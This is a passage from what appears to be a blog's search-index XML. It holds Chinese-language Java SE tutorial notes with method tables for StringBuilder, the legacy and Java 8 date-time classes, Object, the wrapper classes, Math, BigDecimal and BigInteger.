index)</td><td>将当前字符串中下标为index位置的单个字符删除</td></tr><tr><td>StringBuilder delete(int start，int end)</td><td>删除字符串</td></tr><tr><td>StringBuilder replace(int start，int end，String str)</td><td>替换字符串</td></tr><tr><td>StringBuilder reverse()</td><td>字符串反转</td></tr></tbody></table><ul><li>注意<br>作为参数传递的话，方法内部String不会改变其值，StringBuﬀer和StringBuilder会改变其值。</li></ul><h3 id="返回值的设计"><a href="#返回值的设计" class="headerlink" title="返回值的设计"></a>返回值的设计</h3><ul><li>StringBuilder的很多方法的返回值均为StringBuilder类型。这些方法的返回语句均为：return this。</li><li>由此可见，这些方法在对StringBuilder所封装的字符序列进行改变后又返回了该对象的引用。基于这样设计的目的在于可以连续调用。</li></ul><hr><h2 id="Java8之前的日期相关类（熟悉）"><a href="#Java8之前的日期相关类（熟悉）" class="headerlink" title="Java8之前的日期相关类（熟悉）"></a>Java8之前的日期相关类（熟悉）</h2><hr><h3 id="System类的概述"><a href="#System类的概述" class="headerlink" title="System类的概述"></a>System类的概述</h3><h4 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>java.lang.System类中提供了一些有用的类字段和方法。</li></ul><h4 id="常用的方法"><a href="#常用的方法" class="headerlink" title="常用的方法"></a>常用的方法</h4><table><thead><tr><th>方法声明</th><th>功能介绍</th></tr></thead><tbody><tr><td>static long currentTimeMillis()</td><td>返回当前时间与1970年1月1日0时0分0秒之间以毫秒为单位的时间差</td></tr></tbody></table><h3 id="Date类的概述"><a href="#Date类的概述" class="headerlink" title="Date类的概述"></a>Date类的概述</h3><h4 id="基本概念-2"><a href="#基本概念-2" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>java.util.Date类主要用于描述特定的瞬间，也就是年月日时分秒，可以精确到毫秒。</li></ul><h4 id="常用的方法-1"><a href="#常用的方法-1" class="headerlink" title="常用的方法"></a>常用的方法</h4><table><thead><tr><th>方法声明</th><th>功能介绍</th></tr></thead><tbody><tr><td>Date()</td><td>使用无参的方式构造对象，也就是当前系统时间</td></tr><tr><td>Date(long date)</td><td>根据参数指定毫秒数构造对象，  参数为距离1970年1月1日0时0分0秒的毫秒数</td></tr><tr><td>long getTime()</td><td>获取调用对象距离1970年1月1日0时0分0秒的毫秒数</td></tr><tr><td>void setTime(long time)</td><td>设置调用对象为距离基准时间time毫秒的时间点</td></tr></tbody></table><h3 id="SimpleDateFormat类的概述"><a href="#SimpleDateFormat类的概述" class="headerlink" title="SimpleDateFormat类的概述"></a>SimpleDateFormat类的概述</h3><h4 id="基本概念-3"><a href="#基本概念-3" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>java.text.SimpleDateFormat类主要用于实现日期和文本之间的转换。</li></ul><h4 id="常用的方法-2"><a href="#常用的方法-2" class="headerlink" title="常用的方法"></a>常用的方法</h4><table><thead><tr><th>方法声明</th><th>功能介绍</th></tr></thead><tbody><tr><td>SimpleDateFormat()</td><td>使用无参方式构造对象</td></tr><tr><td>SimpleDateFormat(String pattern)</td><td>根据参数指定的模式来构造对象，模式主要有: y-年  M-月  d-日 H-时  m-分  s-秒</td></tr><tr><td>ﬁnal String format(Date date)</td><td>用于将日期类型转换为文本类型</td></tr><tr><td>Date parse(String source)</td><td>用于将文本类型转换为日期类型</td></tr></tbody></table><h3 id="Calendar类的概述"><a href="#Calendar类的概述" class="headerlink" title="Calendar类的概述"></a>Calendar类的概述</h3><h4 id="基本概念-4"><a href="#基本概念-4" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>java.util.Calender类主要用于描述特定的瞬间，取代Date类中的过时方法实现全球化。</li><li>该类是个抽象类，因此不能实例化对象，其具体子类针对不同国家的日历系统，其中应用最广泛的是GregorianCalendar（格里高利历），对应世界上绝大多数国家&#x2F;地区使用的标准日历系统。</li></ul><h4 id="常用的方法-3"><a href="#常用的方法-3" class="headerlink" title="常用的方法"></a>常用的方法</h4><table><thead><tr><th>方法声明</th><th>功能介绍</th></tr></thead><tbody><tr><td>static Calendar getInstance()</td><td>用于获取Calendar类型的引用</td></tr><tr><td>void set(int year, int month, int date, int hourOfDay, int <br/>minute, int second)</td><td>用于设置年月日时分秒信息</td></tr><tr><td>Date getTime()</td><td>用于将Calendar类型转换为Date类型</td></tr><tr><td>void set(int ﬁeld, int value)</td><td>设置指定字段的数值</td></tr><tr><td>void add(int ﬁeld, int amount)</td><td>向指定字段增加数值</td></tr></tbody></table><h4 id="多态的使用场合"><a href="#多态的使用场合" class="headerlink" title="多态的使用场合"></a>多态的使用场合</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过方法的参数传递形成多态； </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">draw</span><span class="params">(Shape s)</span>&#123; </span><br><span class="line">     s.show();</span><br><span class="line">&#125;</span><br><span class="line">draw(<span class="keyword">new</span> <span class="title class_">Rect</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>));</span><br><span class="line"><span class="comment">//在方法体中直接使用多态的语法格式 </span></span><br><span class="line"><span class="type">Account</span> <span class="variable">acc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FixedAccount</span>(); </span><br><span class="line"><span class="comment">//通过方法的返回值类型形成多态 </span></span><br><span class="line">Calender <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">GregorianCalendar</span>(zone, aLocale); </span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h2 id="Java8中的日期相关类（熟悉）"><a href="#Java8中的日期相关类（熟悉）" class="headerlink" title="Java8中的日期相关类（熟悉）"></a>Java8中的日期相关类（熟悉）</h2><hr><h3 id="Java8日期类的由来"><a href="#Java8日期类的由来" class="headerlink" title="Java8日期类的由来"></a>Java8日期类的由来</h3><p>JDK 1.0中包含了一个java.util.Date类，但是它的大多数方法已经在JDK 1.1引入Calendar类之后被弃用了。而Calendar并不比Date好多少。它们面临的问题是：</p><ul><li>Date类中的年份是从1900开始的，而月份都从0开始。 </li><li>格式化只对Date类有用，对Calendar类则不能使用。 </li><li>非线程安全等。</li></ul><h3 id="Java8日期类的概述"><a href="#Java8日期类的概述" class="headerlink" title="Java8日期类的概述"></a>Java8日期类的概述</h3><ul><li>Java 8通过发布新的Date-Time API来进一步加强对  日期与时间的处理。</li><li>java.time包：该包日期&#x2F;时间API的基础包。</li><li>java.time.chrono包：该包提供对不同日历系统的访问。</li><li>java.time.format包：该包能够格式化和解析日期时间对象。</li><li>java.time.temporal包：该包包含底层框架和扩展特性。</li><li>java.time.zone包：该包支持不同时区以及相关规则的类。</li></ul><h3 id="LocalDate类的概述"><a href="#LocalDate类的概述" class="headerlink" title="LocalDate类的概述"></a>LocalDate类的概述</h3><h4 id="基本概念-5"><a href="#基本概念-5" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>java.time.LocalDate类主要用于描述年-月-日格式的日期信息，该类不表示时间和时区信息。</li></ul><h4 id="常用的方法-4"><a href="#常用的方法-4" class="headerlink" title="常用的方法"></a>常用的方法</h4><table><thead><tr><th>方法声明</th><th>功能介绍</th></tr></thead><tbody><tr><td>static LocalDate now()</td><td>在默认时区中从系统时钟获取当前日期</td></tr></tbody></table><h3 id="LocalTime类的概述"><a href="#LocalTime类的概述" class="headerlink" title="LocalTime类的概述"></a>LocalTime类的概述</h3><h4 id="基本概念-6"><a href="#基本概念-6" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>java.time.LocalTime 类主要用于描述时间信息，可以描述时分秒以及纳秒。</li></ul><h4 id="常用的方法-5"><a href="#常用的方法-5" class="headerlink" title="常用的方法"></a>常用的方法</h4><table><thead><tr><th>方法声明</th><th>功能介绍</th></tr></thead><tbody><tr><td>static LocalTime now()</td><td>从默认时区的系统时间中获取当前时间</td></tr><tr><td>static LocalTime now(ZoneId zone)</td><td>获取指定时区的当前时间</td></tr></tbody></table><h3 id="LocalDateTime类的概述"><a href="#LocalDateTime类的概述" class="headerlink" title="LocalDateTime类的概述"></a>LocalDateTime类的概述</h3><h4 id="基本概念-7"><a href="#基本概念-7" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>java.time.LocalDateTime类主要用于描述ISO-8601日历系统中没有时区的日期时间，如2007-12-<br>03T10:15:30。</li></ul><h4 id="常用的方法-6"><a href="#常用的方法-6" class="headerlink" title="常用的方法"></a>常用的方法</h4><table><thead><tr><th>方法声明</th><th>功能介绍</th></tr></thead><tbody><tr><td>static LocalDateTime now()</td><td>从默认时区的系统时间中获取当前日期时间</td></tr><tr><td>static LocalDateTime of(int year, int month, int dayOfMonth, int hour, int minute, int second)</td><td>根据参数指定的年月日时分秒信息来设置日期时间</td></tr><tr><td>int getYear()</td><td>获取年份字段的数值</td></tr><tr><td>int getMonthValue()</td><td>获取1到12之间的月份字段</td></tr><tr><td>int getDayOfMonth()</td><td>获取日期字段</td></tr><tr><td>int getHour()</td><td>获取小时数</td></tr><tr><td>int getMinute()</td><td>获取分钟数</td></tr><tr><td>int getSecond()</td><td>获取秒数</td></tr><tr><td>LocalDateTime withYear(int year)</td><td>设置为参数指定的年</td></tr><tr><td>LocalDateTime withMonth(int month)</td><td>设置为参数指定的月</td></tr><tr><td>LocalDateTime withDayOfMonth(int dayOfMonth)</td><td>设置为参数指定的日</td></tr><tr><td>LocalDateTime withHour(int hour)</td><td>设置为参数指定的时</td></tr><tr><td>LocalDateTime withMinute(int minute)</td><td>设置为参数指定的分</td></tr><tr><td>LocalDateTime withSecond(int second)</td><td>设置为参数指定的秒</td></tr><tr><td>LocalDateTime plusYears(long years)</td><td>加上参数指定的年</td></tr><tr><td>LocalDateTime plusMonths(long months)</td><td>加上参数指定的月</td></tr><tr><td>LocalDateTime plusDays(long days)</td><td>加上参数指定的日</td></tr><tr><td>LocalDateTime plusHours(long hours)</td><td>加上参数指定的时</td></tr><tr><td>LocalDateTime plusMinutes(long minutes)</td><td>加上参数指定的分</td></tr><tr><td>LocalDateTime plusSeconds(long seconds)</td><td>加上参数指定的秒</td></tr><tr><td>LocalDateTime minusYears(long years)</td><td>减去参数指定的年</td></tr><tr><td>LocalDateTime minusMonths(long months)</td><td>减去参数指定的月</td></tr><tr><td>LocalDateTime minusDays(long days)</td><td>减去参数指定的日</td></tr><tr><td>LocalDateTime minusHours(long hours)</td><td>减去参数指定的时</td></tr><tr><td>LocalDateTime minusMinutes(long minutes)</td><td>减去参数指定的分</td></tr><tr><td>LocalDateTime minusSeconds(long seconds)</td><td>减去参数指定的秒</td></tr></tbody></table><h3 id="Instant类的概述"><a href="#Instant类的概述" class="headerlink" title="Instant类的概述"></a>Instant类的概述</h3><h4 id="基本概念-8"><a href="#基本概念-8" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>java.time.Instant类主要用于描述瞬间的时间点信息。</li></ul><h4 id="常用的方法-7"><a href="#常用的方法-7" class="headerlink" title="常用的方法"></a>常用的方法</h4><table><thead><tr><th>方法声明</th><th>功能介绍</th></tr></thead><tbody><tr><td>static Instant now()</td><td>从系统时钟上获取当前时间</td></tr><tr><td>OﬀsetDateTime atOﬀset(ZoneOﬀset oﬀset)</td><td>将此瞬间与偏移量组合以创建偏移日期时间</td></tr><tr><td>static Instant ofEpochMilli(long epochMilli)</td><td>根据参数指定的毫秒数来构造对象，参数为距离1970年1月1日0时0分0秒的毫秒数</td></tr><tr><td>long toEpochMilli()</td><td>获取距离1970年1月1日0时0分0秒的毫秒数</td></tr></tbody></table><h3 id="DateTimeFormatter类的概述"><a href="#DateTimeFormatter类的概述" class="headerlink" title="DateTimeFormatter类的概述"></a>DateTimeFormatter类的概述</h3><h4 id="基本概念-9"><a href="#基本概念-9" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>java.time.format.DateTimeFormatter类主要用于格式化和解析日期。</li></ul><h4 id="常用的方法-8"><a href="#常用的方法-8" class="headerlink" title="常用的方法"></a>常用的方法</h4><table><thead><tr><th>方法声明</th><th>功能介绍</th></tr></thead><tbody><tr><td>static DateTimeFormatter ofPattern(String pattern)</td><td>根据参数指定的模式来获取对象</td></tr><tr><td>String format(TemporalAccessor temporal)</td><td>将参数指定日期时间转换为字符串</td></tr><tr><td>TemporalAccessor parse(CharSequence text)</td><td>将参数指定字符串转换为日期时间</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java常用类的概述和使用</title>
      <link href="/2017/05/26/Java%E5%B8%B8%E7%94%A8%E7%B1%BB%E7%9A%84%E6%A6%82%E8%BF%B0%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
      <url>/2017/05/26/Java%E5%B8%B8%E7%94%A8%E7%B1%BB%E7%9A%84%E6%A6%82%E8%BF%B0%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="常用的包（熟悉）"><a href="#常用的包（熟悉）" class="headerlink" title="常用的包（熟悉）"></a>常用的包（熟悉）</h2><hr><h3 id="包的名称和功能"><a href="#包的名称和功能" class="headerlink" title="包的名称和功能"></a>包的名称和功能</h3><ul><li>java.lang包 - 该包是Java语言的核心包，并且该包中的所有内容由Java虚拟机自动导入。<br> 如：System类、String类、…</li><li>java.util包 - 该包是Java语言的工具包，里面提供了大量工具类以及集合类等。 <br>如：Scanner类、Random类、List集合、…</li><li>java.io包   - 该包是Java语言中的输入输出包，里面提供了大量读写文件相关的类等。<br> 如：FileInputStream类、FileOutputStream类、…</li><li>java.net包  - 该包是Java语言中的网络包，里面提供了大量网络编程相关的类等。<br> 如：ServerSocket类、Socket类、…</li><li>java.sql 包  - 该包是Java语言中的数据包，里面提供了大量操作数据库的类和接口等。 <br>如：DriverManager类、Connection接口、…</li><li>Java程序员在编程时可以使用大量类库，因此Java编程时需要记的很多，对编程能力本身要求不是特别的高</li></ul><hr><h2 id="Object类的概述（重点"><a href="#Object类的概述（重点" class="headerlink" title="Object类的概述（重点)"></a>Object类的概述（重点)</h2><hr><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ul><li>java.lang.Object类是Java语言中类层次结构的根类，也就是说任何一个类都是该类的直接或者间<br>接子类。</li><li>如果定义一个Java类时没有使用extends关键字声明其父类，则其父类为 java.lang.Object 类。 </li><li>Object类定义了“对象”的基本行为, 被子类默认继承。</li></ul><hr><h3 id="常用的方法"><a href="#常用的方法" class="headerlink" title="常用的方法"></a>常用的方法</h3><table><thead><tr><th align="left"><strong>方法声明</strong></th><th align="left"><strong>功能介绍</strong></th></tr></thead><tbody><tr><td align="left">Object()</td><td align="left">使用无参方式构造对象</td></tr><tr><td align="left">boolean equals(Object obj)</td><td align="left">用于判断调用对象是否与参数对象相等。该方法默认比较两个对象的地址是否相等，与 &#x3D;&#x3D; 运算符的结果一致 若希望比较两个对象的内容，则需要重写该方法。若该方法被重写后，则应该重写hashCode方法来保证结果的一致性。</td></tr><tr><td align="left">int hashCode()</td><td align="left">用于获取调用对象的哈希码值(内存地址的编号)。<br>若两个对象调用equals方法相等，则各自调用该方法的结果必须相同若两个调用对象equals方法不相等，则各自调用该方法的结果应该不相同。<br>为了使得该方法与equals方法保持一致，需要重写该方法。</td></tr><tr><td align="left">String toString()</td><td align="left">用于获取调用对象的字符串形式<br>该方法默认返回的字符串为：包名.类名@哈希码值的十六进制<br>为了返回更有意义的数据，需要重写该方法<br>使用print或println打印引用或字符串拼接引用都会自动调用该方法</td></tr><tr><td align="left">Class&amp;lt?&gt; getClass()</td><td align="left">用于返回调用对象执行时的Class实例，反射机制使用</td></tr></tbody></table><p>案例题目：</p><pre><code>编程实现Student类的封装，特征：学号(id)和姓名，要求提供打印所有特征的方法。编程实现StudentTest类，在main方法中使用有参方式构造两个Student类型的对象并打印特征。</code></pre><p>题目扩展:</p><pre><code>如何实现以姓名作为基准判断两个对象是否相等？以及以学号和姓名同时作为基准判断两个对象是否相等？</code></pre><hr><h2 id="包装类（熟悉）"><a href="#包装类（熟悉）" class="headerlink" title="包装类（熟悉）"></a>包装类（熟悉）</h2><hr><h3 id="包装类的概念"><a href="#包装类的概念" class="headerlink" title="包装类的概念"></a>包装类的概念</h3><ul><li>通常情况下基本数据类型的变量不是对象，为了满足万物皆对象的理念就需要对基本数据类型的变量进行打包封装处理变成对象，而负责将这些变量声明为成员变量进行对象化处理的相关类，叫做包装类。</li></ul><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(); </span><br><span class="line"><span class="type">int</span>  <span class="variable">num</span> <span class="operator">=</span> <span class="number">10</span>;</span><br></pre></td></tr></table></figure><h3 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h3><table><thead><tr><th align="left">包装类</th><th align="left">对应的基本类型</th></tr></thead><tbody><tr><td align="left">java.lang.Byte</td><td align="left">byte</td></tr><tr><td align="left">java.lang.Short</td><td align="left">short</td></tr><tr><td align="left">java.lang.Integer</td><td align="left">int</td></tr><tr><td align="left">java.lang.Long</td><td align="left">long</td></tr><tr><td align="left">java.lang.Float</td><td align="left">float</td></tr><tr><td align="left">java.lang.Double</td><td align="left">double</td></tr><tr><td align="left">java.lang.Boolean</td><td align="left">boolean</td></tr><tr><td align="left">java.lang.Character</td><td align="left">char</td></tr></tbody></table><hr><h2 id="Integer类的概述"><a href="#Integer类的概述" class="headerlink" title="Integer类的概述"></a>Integer类的概述</h2><hr><h3 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h3><p>java.lang.Integer类内部包装了一个int类型的变量作为成员变量，主要用于实现对int类型的包装并提供int类型到String类之间的转换等方法。</p><h3 id="常用的常量"><a href="#常用的常量" class="headerlink" title="常用的常量"></a>常用的常量</h3><table><thead><tr><th align="left">常量类型和名称</th><th align="left">功能介绍</th></tr></thead><tbody><tr><td align="left">public static ﬁnal int MAX_VALUE</td><td align="left">表示int类型可以描述的最大值，即2^31-1</td></tr><tr><td align="left">public static ﬁnal int MIN_VALUE</td><td align="left">表示int类型可以描述的最小值，即-2^31</td></tr><tr><td align="left">public static ﬁnal int SIZE</td><td align="left">表示int类型采用二进制补码形式的位数</td></tr><tr><td align="left">public static ﬁnal int BYTES</td><td align="left">表示int类型所占的字节个数</td></tr><tr><td align="left">public static ﬁnal Class TYPE</td><td align="left">表示int类型的Class实例</td></tr></tbody></table><h3 id="常用的方法-1"><a href="#常用的方法-1" class="headerlink" title="常用的方法"></a>常用的方法</h3><table><thead><tr><th align="left">方发声明</th><th align="left">功能介绍</th></tr></thead><tbody><tr><td align="left">Integer(int value)</td><td align="left">根据参数指定的整数来构造对象（已过时）</td></tr><tr><td align="left">Integer(String s)</td><td align="left">根据参数指定的字符串来构造对象  （已过时）</td></tr><tr><td align="left">int intValue()</td><td align="left">获取调用对象中的整数值并返回</td></tr><tr><td align="left">static Integer valueOf(int i)</td><td align="left">根据参数指定整数值得到Integer类型对象</td></tr><tr><td align="left">boolean equals(Object obj)</td><td align="left">比较调用对象与参数指定的对象是否相等</td></tr><tr><td align="left">String toString()</td><td align="left">返回描述调用对象数值的字符串形式</td></tr><tr><td align="left">static int parseInt(String s)</td><td align="left">将字符串类型转换为int类型并返回</td></tr><tr><td align="left">static String toString(int i)</td><td align="left">获取参数指定整数的十进制字符串形式</td></tr><tr><td align="left">static String toBinaryString(int i)</td><td align="left">获取参数指定整数的二进制字符串形式</td></tr><tr><td align="left">static String toHexString(int i)</td><td align="left">获取参数指定整数的十六进制字符串形式</td></tr><tr><td align="left">static String toOctalString(int i)</td><td align="left">获取参数指定整数的八进制字符串形式</td></tr></tbody></table><h3 id="装箱和拆箱的概念"><a href="#装箱和拆箱的概念" class="headerlink" title="装箱和拆箱的概念"></a>装箱和拆箱的概念</h3><ul><li>在Java5发布之前使用包装类对象进行运算时，需要较为繁琐的“拆箱”和“装箱”操作；即运算前先将包装类对象拆分为基本类型数据，运算后再将结果封装成包装类对象。</li><li>从Java5开始增加了自动拆箱和自动装箱的功能。</li></ul><h3 id="自动装箱池"><a href="#自动装箱池" class="headerlink" title="自动装箱池"></a>自动装箱池</h3><ul><li>在Integer类的内部提供了自动装箱池技术，将-128到127之间的整数已经装箱完毕，当程序中使用该范围之间的整数时，无需装箱直接取用自动装箱池中的对象即可，从而提高效率。</li></ul><hr><h2 id="Double类的概述"><a href="#Double类的概述" class="headerlink" title="Double类的概述"></a>Double类的概述</h2><hr><h3 id="基本概念-2"><a href="#基本概念-2" class="headerlink" title="基本概念"></a>基本概念</h3><ul><li>java.lang.Double类型内部包装了一个double类型的变量作为成员变量，主要用于实现对double 类型的包装并提供double类型到String类之间的转换等方法。</li></ul><h3 id="常用的常量-1"><a href="#常用的常量-1" class="headerlink" title="常用的常量"></a>常用的常量</h3><table><thead><tr><th align="left">常量类型和名称</th><th align="left">功能介绍</th></tr></thead><tbody><tr><td align="left">public static ﬁnal int SIZE</td><td align="left">表示double类型的二进制位数</td></tr><tr><td align="left">public static ﬁnal int BYTES</td><td align="left">public static ﬁnal int BYTES</td></tr><tr><td align="left">public static ﬁnal Class TYPE</td><td align="left">表示double类型的Class实例</td></tr></tbody></table><h3 id="常用的方法-2"><a href="#常用的方法-2" class="headerlink" title="常用的方法"></a>常用的方法</h3><table><thead><tr><th align="left">方法声明</th><th align="left">功能介绍</th></tr></thead><tbody><tr><td align="left">Double(double value)</td><td align="left">根据参数指定的浮点数据来构造对象（已过时）</td></tr><tr><td align="left">Double(String s)</td><td align="left">根据参数指定的字符串来构造对象  （已过时）</td></tr><tr><td align="left">double doubleValue()</td><td align="left">获取调用对象中的浮点数据并返回</td></tr><tr><td align="left">static Double valueOf(double d)</td><td align="left">根据参数指定浮点数据得到Double类型对象</td></tr><tr><td align="left">boolean equals(Object obj)</td><td align="left">比较调用对象与参数指定的对象是否相等</td></tr><tr><td align="left">String toString()</td><td align="left">返回描述调用对象数值的字符串形式</td></tr><tr><td align="left">static double parseDouble(String s)</td><td align="left">将字符串类型转换为double类型并返回</td></tr><tr><td align="left">boolean isNaN()</td><td align="left">判断调用对象的数值是否为非数字</td></tr></tbody></table><p>扩展</p><ul><li>java.lang.Number类是个抽象类，是上述类的父类来描述所有类共有的成员。</li></ul><hr><h2 id="Boolean类的概述"><a href="#Boolean类的概述" class="headerlink" title="Boolean类的概述"></a>Boolean类的概述</h2><hr><h3 id="基本概念-3"><a href="#基本概念-3" class="headerlink" title="基本概念"></a>基本概念</h3><ul><li>java.lang.Boolean类型内部包装了一个boolean类型的变量作为成员变量，主要用于实现对 boolean类型的包装并提供boolean类型到String类之间的转换等方法。</li></ul><h3 id="常用的常量-2"><a href="#常用的常量-2" class="headerlink" title="常用的常量"></a>常用的常量</h3><table><thead><tr><th align="left">常量类型和名称</th><th align="left">功能介绍</th></tr></thead><tbody><tr><td align="left">public static ﬁnal Boolean FALSE</td><td align="left">对应基值为false的对象</td></tr><tr><td align="left">public static ﬁnal Boolean TRUE</td><td align="left">对应基值为true的对象</td></tr><tr><td align="left">public static ﬁnal Class TYPE</td><td align="left">表示boolean类型的Class实例</td></tr></tbody></table><h3 id="常用的方法-3"><a href="#常用的方法-3" class="headerlink" title="常用的方法"></a>常用的方法</h3><table><thead><tr><th align="left">方法声明</th><th align="left">功能介绍</th></tr></thead><tbody><tr><td align="left">Boolean(boolean value)</td><td align="left">根据参数指定的布尔数值来构造对象（已过时）</td></tr><tr><td align="left">Boolean(String s)</td><td align="left">根据参数指定的字符串来构造对象  （已过时）</td></tr><tr><td align="left">boolean booleanValue()</td><td align="left">获取调用对象中的布尔数值并返回</td></tr><tr><td align="left">static Boolean valueOf(boolean b)</td><td align="left">根据参数指定布尔数值得到Boolean类型对象</td></tr><tr><td align="left">boolean equals(Object obj)</td><td align="left">比较调用对象与参数指定的对象是否相等</td></tr><tr><td align="left">static boolean parseBoolean(String s)</td><td align="left">将字符串类型转换为boolean类型并返回</td></tr></tbody></table><h2 id="Character类的概述"><a href="#Character类的概述" class="headerlink" title="Character类的概述"></a>Character类的概述</h2><hr><h3 id="基本概念-4"><a href="#基本概念-4" class="headerlink" title="基本概念"></a>基本概念</h3><ul><li>java.lang.Character类型内部包装了一个char类型的变量作为成员变量，主要用于实现对char类型的包装并提供字符类别的判断和转换等方法。</li></ul><h3 id="常用的常量-3"><a href="#常用的常量-3" class="headerlink" title="常用的常量"></a>常用的常量</h3><table><thead><tr><th align="left">常量类型和名称</th><th align="left">功能介绍</th></tr></thead><tbody><tr><td align="left">public static ﬁnal int SIZE</td><td align="left">表示char类型的二进制位数</td></tr><tr><td align="left">public static ﬁnal int BYTES</td><td align="left">表示char类型的字节个数</td></tr><tr><td align="left">public static ﬁnal Class TYPE</td><td align="left">public static ﬁnal Class TYPE</td></tr></tbody></table><h3 id="常用的方法-4"><a href="#常用的方法-4" class="headerlink" title="常用的方法"></a>常用的方法</h3><table><thead><tr><th align="left">方法声明</th><th align="left">功能介绍</th></tr></thead><tbody><tr><td align="left">Character(char value)</td><td align="left">根据参数指定的字符数据来构造对象（已过时）</td></tr><tr><td align="left">char charValue()</td><td align="left">获取调用对象中的字符数据并返回</td></tr><tr><td align="left">static Character valueOf(char c)</td><td align="left">根据参数指定字符数据得到Character类型对象</td></tr><tr><td align="left">boolean equals(Object obj)</td><td align="left">比较调用对象与参数指定的对象是否相等</td></tr><tr><td align="left">String toString()</td><td align="left">返回描述调用对象数值的字符串形式</td></tr><tr><td align="left">static boolean isUpperCase(char ch)</td><td align="left">判断参数指定字符是否为大写字符</td></tr><tr><td align="left">static boolean isLowerCase(char ch)</td><td align="left">判断参数指定字符是否为小写字符</td></tr><tr><td align="left">static boolean isDigit(char ch)</td><td align="left">判断参数指定字符是否为数字字符</td></tr><tr><td align="left">static char toUpperCase(char ch)</td><td align="left">将参数指定的字符转换为大写字符</td></tr><tr><td align="left">static char toLowerCase(char ch)</td><td align="left">将参数指定的字符转换为小写字符</td></tr></tbody></table><h3 id="包装类（Wrapper）的使用总结"><a href="#包装类（Wrapper）的使用总结" class="headerlink" title="包装类（Wrapper）的使用总结"></a>包装类（Wrapper）的使用总结</h3><ul><li>基本数据类型转换为对应包装类的方式<br>调用包装类的构造方法或静态方法即可</li><li>获取包装类对象中基本数据类型变量数值的方式 <br>调用包装类中的xxxValue方法即可</li><li>字符串转换为基本数据类型的方式 <br>调用包装类中的parseXxx方法即可</li></ul><h2 id="数学处理类（熟悉）"><a href="#数学处理类（熟悉）" class="headerlink" title="数学处理类（熟悉）"></a>数学处理类（熟悉）</h2><hr><h3 id="Math类的概述"><a href="#Math类的概述" class="headerlink" title="Math类的概述"></a>Math类的概述</h3><h4 id="基本概念-5"><a href="#基本概念-5" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>java.lang.Math类主要用于提供执行数学运算的方法，如：对数，平方根。</li></ul><h4 id="常用的方法-5"><a href="#常用的方法-5" class="headerlink" title="常用的方法"></a>常用的方法</h4><table><thead><tr><th align="left">方法声明</th><th align="left">功能介绍</th></tr></thead><tbody><tr><td align="left">static int max(int a, int b)</td><td align="left">返回两个参数中的最大值</td></tr><tr><td align="left">static int min(int a, int b)</td><td align="left">返回两个参数中的最小值</td></tr><tr><td align="left">static double pow(double a, double b)</td><td align="left">返回第一个参数的幂</td></tr><tr><td align="left">static int abs(int a)</td><td align="left">返回参数指定数值的绝对值</td></tr><tr><td align="left">static long round(double a)</td><td align="left">返回参数四舍五入的结果</td></tr><tr><td align="left">static double sqrt(double a)</td><td align="left">返回参数的平方根</td></tr><tr><td align="left">static double random()</td><td align="left">返回0.0到1.0的随机数</td></tr></tbody></table><h3 id="BigDecimal类的概述"><a href="#BigDecimal类的概述" class="headerlink" title="BigDecimal类的概述"></a>BigDecimal类的概述</h3><h4 id="基本概念-6"><a href="#基本概念-6" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>由于ﬂoat类型和double类型在运算时可能会有误差，若希望实现精确运算则借助 java.math.BigDecimal类型加以描述。</li></ul><h4 id="常用的方法-6"><a href="#常用的方法-6" class="headerlink" title="常用的方法"></a>常用的方法</h4><table><thead><tr><th align="left">方法声明</th><th align="left">功能介绍</th></tr></thead><tbody><tr><td align="left">BigDecimal(String val)</td><td align="left">根据参数指定的字符串来构造对象</td></tr><tr><td align="left">BigDecimal add(BigDecimal augend)</td><td align="left">用于实现加法运算</td></tr><tr><td align="left">BigDecimal subtract(BigDecimal subtrahend)</td><td align="left">用于实现减法运算</td></tr><tr><td align="left">BigDecimal multiply(BigDecimal multiplicand)</td><td align="left">BigDecimal multiply(BigDecimal multiplicand)</td></tr><tr><td align="left">BigDecimal divide(BigDecimal divisor)</td><td align="left">用于实现除法运算</td></tr></tbody></table><h3 id="BigInteger类的概念"><a href="#BigInteger类的概念" class="headerlink" title="BigInteger类的概念"></a>BigInteger类的概念</h3><h4 id="基本概念-7"><a href="#基本概念-7" class="headerlink" title="基本概念"></a>基本概念</h4><ul><li>若希望表示比long类型范围还大的整数数据，则需要借助java.math.BigInteger类型描述。</li></ul><h4 id="常用的方法-7"><a href="#常用的方法-7" class="headerlink" title="常用的方法"></a>常用的方法</h4><table><thead><tr><th align="left">方法声明</th><th align="left">功能介绍</th></tr></thead><tbody><tr><td align="left">BigInteger(String val)</td><td align="left">根据参数指定的字符串来构造对象</td></tr><tr><td align="left">BigInteger add(BigInteger val)</td><td align="left">用于实现加法运算</td></tr><tr><td align="left">BigInteger subtract(BigInteger val)</td><td 